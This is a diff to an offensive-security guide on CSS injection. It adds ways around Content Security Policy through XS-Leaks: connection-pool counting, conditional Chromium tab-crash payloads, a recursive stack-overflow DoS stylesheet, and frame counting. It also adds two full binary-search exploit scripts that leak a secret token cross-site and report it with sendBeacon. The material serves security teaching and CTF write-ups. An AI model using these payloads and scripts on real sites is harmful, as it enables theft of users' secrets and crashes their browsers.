@@ -204,21 +204,25 @@ This makes a request to https://example.com/42, leaking the secret to the attack
 
 ## CSP Bypasses
 
-### No fonts allowed (font-src)
+### No images allowed (img-src)
 
-When wanting to leak text nodes, the previously explained technique requires custom fonts to give characters varying heights. If you are not allowed to load custom fonts (even from eg. file uploads with `'self'`), another technique exists that uses more complex CSS features to achieve the same result:
+If loading external images for exfiltration is disallowed by a CSP img-src directive, you may still be able to use font URLs if they are not blocked by font-src, connect-src or default-src directives. You must first define a `@font-face { font-family: a; src: url(...) }`, and then reference it in a selector like `input[value^="a"] { font-family: a }`. This works because the font will only be loaded if it is required by some element on the page.
+
+### Text nodes without fonts (font-src)
+
+When wanting to leak text nodes, the [#font-ligatures](css-injection.md#font-ligatures "mention") technique requires custom fonts to give character sequences varying heights. If you are **not** allowed to load custom fonts (even from eg. file uploads with `'self'`), this technique exists that uses more complex CSS features to achieve the same result:
 
 {% embed url="https://blog.pspaul.de/posts/bench-press-leaking-text-nodes-with-css/" %}
 Leaking text _without_ fonts or @import chaining
 {% endembed %}
 
-### No images allowed (img-src)
+### XS-Leaks without network
 
-If loading external images for exfiltration is disallowed by a CSP img-src directive, you may still be able to use font URLs if they are not blocked by font-src, connect-src or default-src directives. You must first define a `@font-face { font-family: a; src: url(...) }`, and then reference it in a selector like `input[value^="a"] { font-family: a }`. This works because the font will only be loaded if it is required by some element on the page.
+If no external requests can be made at all due to a strict CSP, it is still possible to use [XS-Leaks](https://xsleaks.dev/). These don't require the target page that you are injecting into to make connections, but instead, use window references or other shared information to **infer the result of a selector**.
 
-### No external connections allowed at all (connect-src)
+#### Connection pool request counting
 
-If no external requests can be made at all due to a strict CSP, it is still possible to use [XS-Leaks](https://xsleaks.dev/). One such leak allows measuring the number of connections a site makes by filling up the connection pool on an attacker's site. By injecting CSS with a unique number of connections for each character, you can determine which character it was based on the number of connections you detect.
+The browser has a limit of 255 simultaneously TCP connections globally. If we force the target to make a specific number of connections for each character, we can detect the limit being reached from our attacker's site and determine the result of the selector.
 
 The writeup below explains this idea in great detail:
 
@@ -226,12 +230,338 @@ The writeup below explains this idea in great detail:
 CSS Exfiltration by measuring connection pool
 {% endembed %}
 
-***
+#### Tab crash detection
 
-There also exists an XS-Leak based on browser crashing. At the time of writing, Chromium crashes when trying to render the `background: linear-gradient(in display-p3, red, blue)` property ([issue](https://issues.chromium.org/issues/382086298)). Using CSS selectors this can be done conditionally.
+Browsers have bugs, that inevitably cause crashes. If these can be conditionally triggered by a CSS selector matching or not, we can detect the fact that a crash occurred to learn the result of the selector cross-site.
 
-Because of [Full Site Isolation](https://chromium.googlesource.com/chromium/src/+/main/docs/process_model_and_site_isolation.md#Full-Site-Isolation-site_per_process), if one page of a site crashes, all other active frames of that site crash too. This is detectable by creating a dummy iframe on the attacker's page of the same site with any path, and measuring `onload=` events. By then conditionally crashing CSS in another iframe or popup window, you can detect the result of a single CSS selector by the dummy iframe crashing with it. Doing this repeatedly allows reading larger strings:
+One _previously working_ crash was rendering `background: linear-gradient(in display-p3, red, blue)` ([issue 382086298](https://issues.chromium.org/issues/382086298)), it could be made conditional like this:
+
+```css
+input[value^="S"] {
+  background: linear-gradient(in display-p3, red, blue)
+}
+```
+
+If the input value starts with an `S`, the property is loaded and the tab will crash. Otherwise, the tab will remain executing normally. The crucial part that makes this detectable cross-site is the fact that if one instance of an origin crashes, all other same-site documents in the same tab context group also crash. This comes from [Full Site Isolation](https://chromium.googlesource.com/chromium/src/+/main/docs/process_model_and_site_isolation.md#Full-Site-Isolation-site_per_process) because they share a process.
+
+**One way** this is **detectable** is using a few dummy iframes on the attacker's page of the same site with any path, and measuring `onload=` events. Once you conditionally crash the target in a popup window, the iframes on your page will crash with it and **stop emitting** `onload=` events. This is detectable, and doing it repeatedly allows reading larger strings (albeit a bit slow).
+
+My writeup below shows me practically using it as an unintended solution to a CTF challenge:
 
 {% embed url="https://jorianwoltjer.com/blog/p/ctf/x3ctf-blogdog-new-css-injection-xs-leak#xs-leak-using-process-crashing" %}
 Writeup of unintentional solution about this new technique, and PoC's
 {% endembed %}
+
+***
+
+Some CSS crashes like [issue 433073118](https://issues.chromium.org/issues/433073118) are useful to crash the page _if it is rendered_, but **don't allow** inserting conditional selectors to make it exploitable for CSS Injection. Because the crash happens while parsing it doesn't matter if it's used or not.
+
+{% code title="Always crashes" %}
+```html
+<style>::placeholder{&{&{
+```
+{% endcode %}
+
+In comparison, another more useful crash was [issue 435225409](https://issues.chromium.org/issues/435225409) where a **selected would have to match** for the crash to occur:
+
+<pre class="language-html" data-title="Conditionally crashes"><code class="lang-html">&#x3C;style>
+@starting-style {
+<strong>  input[value^="S"]::first-letter {
+</strong>    color: red;
+  }
+}
+&#x3C;/style>
+&#x3C;input value="SECRET">
+</code></pre>
+
+One **non-issue** way to crash _Chrome for Windows_ (doesn't happen on Linux for some reason) relatively quickly is using a recursive DoS payload with variables that reference each other resulting in exponential growth:
+
+```css
+html {
+  --a: url(/?1),url(/?1),url(/?1),url(/?1),url(/?1);
+  --b: var(--a),var(--a),var(--a),var(--a),var(--a);
+  --c: var(--b),var(--b),var(--b),var(--b),var(--b);
+  --d: var(--c),var(--c),var(--c),var(--c),var(--c);
+  --e: var(--d),var(--d),var(--d),var(--d),var(--d);
+  --f: var(--e),var(--e),var(--e),var(--e),var(--e);
+  --g: var(--f),var(--f),var(--f),var(--f),var(--f);
+}
+html:has(input[value^="S"]) {
+  background-image: var(--g);
+}
+```
+
+> Error code: `STATUS_STACK_OVERFLOW`
+
+All of the above crashes are also detectable with another more consistent method using a window reference. Using the fact that a hash change (appending `#1` but keeping the rest of the URL the same) causes no reload on a regular existing tab, but does cause a reload on a _crashed_ tab. While reloading the browser seems to not be able to keep up with the hash changes and **only puts the first in history**.\
+This is then detectable using `window.length` after navigating it back to a same-origin page like `about:blank`.
+
+The JavaScript function below can easily test for if a URL crashes or not by opening it in a new window:
+
+```javascript
+function isCrashing(url) {
+  return new Promise((resolve) => {
+    const w = window.open(url);
+    setTimeout(async () => {
+      // Crashed tab reloads here, but normal tab does not. We can detect this in history.length
+      w.location = url + "#1";
+      w.location = url + "#2";
+      w.location = url + "#3";
+      w.location = "about:blank";
+      while (true) {  // Wait for `w` to become same-origin
+        try {
+          w.origin;
+          break;
+        } catch {
+          await sleep(100);
+        }
+      }
+      resolve(w.history.length < 4);  // If all navigations were added, it didn't crash
+      w.close();
+    }, 1000);  // Time until crash definitely happened
+  });
+}
+// Usage
+console.log(await isCrashing("https://target.tld/?css=..."));
+```
+
+{% hint style="success" %}
+**Tip**: If you are in search of a method without the interaction required for `window.open()` you can simply open it once and change the leak to `w.location = url` and count the _difference_ of lengths before and after instead.
+{% endhint %}
+
+#### `<object>` Frame Counting
+
+A popular XS-Leak is called [Frame Counting](https://xsleaks.dev/docs/attacks/frame-counting/), abusing the cross-origin [`window.length`](https://developer.mozilla.org/en-US/docs/Web/API/Window/length) property on window references to count the number of `<iframe>`, `<object>` and `<embed>` elements. You can conditionally apply [`display: none`](https://developer.mozilla.org/en-US/docs/Web/CSS/display#display_none) to these to hide them from the counter. Since this is detectable cross-site, it's a great simple way to detect the result of a selector if there are such elements on the page, or if you can inject them.
+
+For **iframes**, you should use [`loading="lazy"`](https://developer.mozilla.org/en-US/docs/Web/Performance/Guides/Lazy_loading#images_and_iframes) and scroll them in or out of view. `<object>` tags the simplest way as shown below (make sure they actually render something like `about:blank`):
+
+{% code title="HTML payload" %}
+```html
+<style>
+  html:has(input[value^="S"]) #leak {
+    display: none;
+  }
+</style>
+<object id="leak" data=about:blank></object>
+<object data=about:blank></object>
+```
+{% endcode %}
+
+If the `input[value^="S"]` selector matches, the length will be 1. If it doesn't match, the length will be 2.
+
+<pre class="language-javascript" data-title="Leak selector result"><code class="lang-javascript">function sleep(ms) {
+  return new Promise(r => setTimeout(r, ms));
+}
+async function waitForLength(w) {
+  while (true) {
+    if (w.length > 0) return;
+    else await sleep(0);
+  }
+}
+
+async function leak(url) {
+  const w = window.open(url);
+  // After at least one object has loaded
+  await waitForLength(w);
+  // Wait a small bit for potentially the 2nd to load (if it's not `display: none`)
+  await sleep(100);
+  const length = w.length;
+  w.close();
+  // Check if the selector matched. If it's 2, didn't match
+<strong>  return length === 1;
+</strong>}
+</code></pre>
+
+***
+
+Apart from frame counting, you can also detect the [`name=`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe#name) attribute of frames by accessing their name as a [property on `window`](https://developer.mozilla.org/en-US/docs/Web/API/Window#named_properties). Using this, you can make specific properties exist if a selector matches, multiple times. This was the solution to a CTF challenge where you needed to perform [#one-shot-using-contains-operator](css-injection.md#one-shot-using-contains-operator "mention") without external network connections:
+
+[Another Another CSP  - justCTF writeup by @terjanq](https://gist.github.com/terjanq/3e866293610aa6c5629df4353e5d87d9#solution)
+
+It is a very generic technique, and if you don't have length restrictions, **by far the fastest way** to leak data with CSS Injection and a restricted CSP.
+
+#### Binary Search
+
+Most of these techniques tell you _yes/no_ if a selector matched or not. While you can sometimes iterate through potential prefix characters, even multiple ones at the same time, in some cases you are restricted to one result at a time. To speed up searches like this you can make use of a [Binary Search](https://en.wikipedia.org/wiki/Binary_search) algorithm where you leak exactly 1 bit of information for every question.
+
+Using CSS selectors, this is simply by just specifying the half of the options it may be using `,` (comma) separated selectors:
+
+```css
+input[value^="A"], input[value^="B"], input[value^="C"], ... {
+  ...
+}
+```
+
+An implementation of this is below for easy copying:
+
+<details>
+
+<summary>Binary Search exploit script</summary>
+
+<pre class="language-html" data-title="exploit.html"><code class="lang-html">&#x3C;script>
+<strong>  const TARGET = "http://127.0.0.1:8080";
+</strong><strong>  const ALPHABET = "0123456789abcdef".split("").join("");
+</strong>
+  function sleep(ms) {
+    return new Promise((resolve) => setTimeout(resolve, ms));
+  }
+  async function waitForLength(w) {
+    while (true) {
+      if (w.length > 0) return;
+      else await sleep(0);
+    }
+  }
+
+  async function leak(url) {
+    const w = window.open(url);
+    // After at least one object has loaded
+    await waitForLength(w);
+    // Wait a small bit for potentially the 2nd to load (if it's not `display: none`)
+    await sleep(100);
+    const length = w.length;
+    w.close();
+    // Check if the selector matched. If it's 2, didn't match
+    return length === 1;
+  }
+
+  async function test(mid) {
+    console.log("chars", ALPHABET.split("").slice(0, mid));
+    const selectors = ALPHABET.split("")
+      .slice(0, mid)
+      .map((c) => `body[secret^="${known + c}"] #leak`)
+      .join(",");
+    // To detect if a selector matched, conditionally display an &#x3C;object> so that .length changes from 1 to 2
+    const payload = `
+  &#x3C;style>
+    ${selectors} {
+      display: none;
+    }
+  &#x3C;/style>
+  &#x3C;object id="leak" data=about:blank>&#x3C;/object>
+  &#x3C;object data=about:blank>&#x3C;/object>
+  `;
+<strong>    // TODO: implement your HTML injection here
+</strong><strong>    const url = TARGET + "/vuln?" + new URLSearchParams({ payload });
+</strong>    return await leak(url);
+  }
+
+  async function binarySearch(low, high) {
+    while (low !== high) {
+      const mid = Math.floor((low + high) / 2);
+      if (await test(mid + 1)) {
+        high = mid;
+      } else {
+        low = mid + 1;
+      }
+    }
+    return low;
+  }
+
+  let known = "";
+
+  (async () => {
+<strong>    for (let i = 0; i &#x3C; 32; i++) {
+</strong>      // Use binary search for highest efficiency
+      const found = await binarySearch(0, ALPHABET.length - 1);
+      known += ALPHABET[found];
+      console.log("Found", known);
+      navigator.sendBeacon("/log?known=" + known);
+    }
+  })();
+&#x3C;/script>
+
+</code></pre>
+
+</details>
+
+If you are able to do around 2 actions at the same time, the `$=` attribute selector allows you to seek backwards at the same time. This will speed up your full search by 2x:
+
+<details>
+
+<summary>Binary Search (both directions) exploit script</summary>
+
+<pre class="language-html" data-title="exploit.html"><code class="lang-html">&#x3C;script>
+<strong>  const TARGET = "http://127.0.0.1:8080";
+</strong><strong>  const ALPHABET = "0123456789abcdef".split("").join("");
+</strong>
+  function sleep(ms) {
+    return new Promise((resolve) => setTimeout(resolve, ms));
+  }
+  async function waitForLength(w) {
+    while (true) {
+      if (w.length > 0) return;
+      else await sleep(0);
+    }
+  }
+
+  async function leak(url) {
+    const w = window.open(url);
+    // After at least one object has loaded
+    await waitForLength(w);
+    // Wait a small bit for potentially the 2nd to load (if it's not `display: none`)
+    await sleep(100);
+    const length = w.length;
+    w.close();
+    // Check if the selector matched. If it's 2, didn't match
+    return length === 1;
+  }
+
+  async function test(mid, backward = false) {
+    console.log("chars", ALPHABET.split("").slice(0, mid));
+    const selectors = ALPHABET.split("")
+      .slice(0, mid)
+      .map((c) => `body[secret${backward ? "$" : "^"}="${backward ? c + suffix : prefix + c}"] #leak`)
+      .join(",");
+    // To detect if a selector matched, conditionally display an &#x3C;object> so that .length changes from 1 to 2
+    const payload = `
+  &#x3C;style>
+    ${selectors} {
+      display: none;
+    }
+  &#x3C;/style>
+  &#x3C;object id="leak" data=about:blank>&#x3C;/object>
+  &#x3C;object data=about:blank>&#x3C;/object>
+  `;
+<strong>    // TODO: implement your HTML injection here
+</strong><strong>    const url = TARGET + "/vuln?" + new URLSearchParams({ payload });
+</strong>    return await leak(url);
+  }
+
+  async function binarySearch(low, high, backward = false) {
+    while (low !== high) {
+      const mid = Math.floor((low + high) / 2);
+      if (await test(mid + 1, backward)) {
+        high = mid;
+      } else {
+        low = mid + 1;
+      }
+    }
+    return low;
+  }
+
+  let prefix = "";
+  let suffix = "";
+
+<strong>  // We search forward (^=) and backward ($=) simultaneously. Token is 32 chars long, so both 16 each
+</strong>  (async () => {
+    for (let i = 0; i &#x3C; 16; i++) {
+      // Use binary search for highest efficiency
+      const found = await binarySearch(0, ALPHABET.length - 1);
+      prefix += ALPHABET[found];
+      console.log("Found", prefix);
+      navigator.sendBeacon("/log?prefix=" + prefix);
+    }
+  })();
+  (async () => {
+    for (let i = 0; i &#x3C; 16; i++) {
+      const found = await binarySearch(0, ALPHABET.length - 1, true);
+      suffix = ALPHABET[found] + suffix;
+      console.log("Found", suffix);
+      navigator.sendBeacon("/log?suffix=" + suffix);
+    }
+  })();
+&#x3C;/script>
+
+</code></pre>
+
+</details>
